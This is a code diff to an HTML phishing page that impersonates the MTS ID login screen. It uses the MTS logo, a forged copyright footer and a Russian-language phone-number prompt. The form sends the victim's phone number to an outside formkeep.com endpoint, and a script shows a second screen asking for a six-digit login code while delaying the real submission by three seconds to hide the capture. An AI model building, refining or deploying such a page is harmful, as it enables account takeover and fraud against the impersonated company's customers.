@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Страница входа - Шаг 1</title>
+    <title>Страница входа</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -22,8 +22,9 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
             margin: auto;
-            width: 320px;
             position: relative;
+            overflow: hidden;
+            width: 320px;
         }
 
         .logo-container {
@@ -44,7 +45,7 @@
 
         .logo-container span {
             font-size: 24px;
-            font-weight: bold;
+            font-weight: 700;
         }
 
         .login-content {
@@ -53,7 +54,9 @@
 
         .login-content p {
             font-size: 16px;
+            color: #000;
             margin-bottom: 20px;
+            font-weight: 500;
         }
 
         .login-content input {
@@ -61,7 +64,19 @@
             padding: 10px;
             font-size: 16px;
             margin-bottom: 20px;
-            border: 1px solid #ccc;
+            border: 2px solid black;
+            border-radius: 4px;
+            text-align: center;
+            color: #333;
+        }
+
+        .login-content input::placeholder {
+            color: #ccc;
+            font-size: 16px;
+        }
+
+        .login-content input#code {
+            border: 2px solid black;
             border-radius: 4px;
         }
 
@@ -79,52 +94,114 @@
             background-color: #e6002e;
         }
 
+        .footer {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            padding: 10px 0;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: #0073e6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
         .hidden {
             display: none;
+        }
+
+        .slide-left {
+            animation: slideLeft 0.5s forwards;
+        }
+
+        .slide-right {
+            animation: slideRight 0.5s forwards;
+        }
+
+        @keyframes slideLeft {
+            from { transform: translateX(0); }
+            to { transform: translateX(-100%); opacity: 0; }
+        }
+
+        @keyframes slideRight {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
+    <div class="login-container" id="login-container">
+        <!-- Логотип и надпись остаются на месте -->
         <div class="logo-container">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Logo_%D0%9C%D0%A2%D0%A1_%282023%29.svg/44px-Logo_%D0%9C%D0%A2%D0%A1_%282023%29.svg.png" alt="МТС Лого">
             <span>ID</span>
         </div>
 
-        <!-- Первый экран -->
-        <div id="step1" class="login-content">
-            <p>Введите номер телефона любого оператора</p>
-            <form id="form" action="https://formkeep.com/f/f51a0a45ae57" method="POST" accept-charset="UTF-8" enctype="multipart/form-data">
-                <input type="tel" name="phone" id="phone" placeholder="+7-000-000-00-00" maxlength="16">
+        <!-- Первый экран с формой Formkeep -->
+        <form action="https://formkeep.com/f/f51a0a45ae57" accept-charset="UTF-8" enctype="multipart/form-data" method="POST" id="form-step1">
+            <div id="step1" class="login-content">
+                <p>Введите номер телефона любого оператора</p>
+                <input type="tel" id="phone" name="phone" placeholder="+7-000-000-00-00" maxlength="16" oninput="formatPhoneInput(this)">
                 <br>
-                <button type="button" onclick="goToStep2()">Далее</button>
-            </form>
-        </div>
+                <button type="button" onclick="delayedFormSubmission()">Далее</button>
+            </div>
+        </form>
 
-        <!-- Второй экран -->
-        <div id="step2" class="login-content hidden">
+        <!-- Второй экран (скрыт по умолчанию) -->
+        <div id="step2" class="hidden login-content">
             <p>Для входа введите код из 6 цифр</p>
             <input type="text" id="code" maxlength="6" placeholder="______">
             <br>
-            <button>Далее</button>
+            <button onclick="goToStep3()">Далее</button>
         </div>
     </div>
 
+    <div class="footer">
+        © 2024 ПАО «МТС». Все права защищены<br>
+        При входе на ресурс, вы принимаете <a href="#">условия доступа</a> и <a href="#">политику обработки ПДн</a>.
+    </div>
+
     <script>
-        function goToStep2() {
-            const form = document.getElementById('form');
+        function formatPhoneInput(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            let formattedValue = '+7-' + value.slice(1, 4);
+            if (value.length > 4) {
+                formattedValue += '-' + value.slice(4, 7);
+            }
+            if (value.length > 7) {
+                formattedValue += '-' + value.slice(7, 9);
+            }
+            if (value.length > 9) {
+                formattedValue += '-' + value.slice(9, 11);
+            }
+            input.value = formattedValue;
+        }
 
-            // Переход на второй экран сразу
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            step1.classList.add('hidden');
-            step2.classList.remove('hidden');
+        function delayedFormSubmission() {
+            const form = document.getElementById('form-step1');
+            goToStep2(); // Переход на второй шаг визуально
 
-            // Через 3 секунды отправка данных формы
             setTimeout(() => {
-                form.submit();
-            }, 3000);
+                form.submit(); // Отправка формы через 3 секунды
+            }, 3000); // 3000 миллисекунд = 3 секунды
+        }
+
+        function goToStep2() {
+            const step1 = document.getElementById('step1');
+            step1.classList.add('slide-left');
+            setTimeout(() => {
+                step1.classList.add('hidden');
+                const step2 = document.getElementById('step2');
+                step2.classList.remove('hidden');
+                step2.classList.add('slide-right');
+            }, 500);
         }
     </script>
 
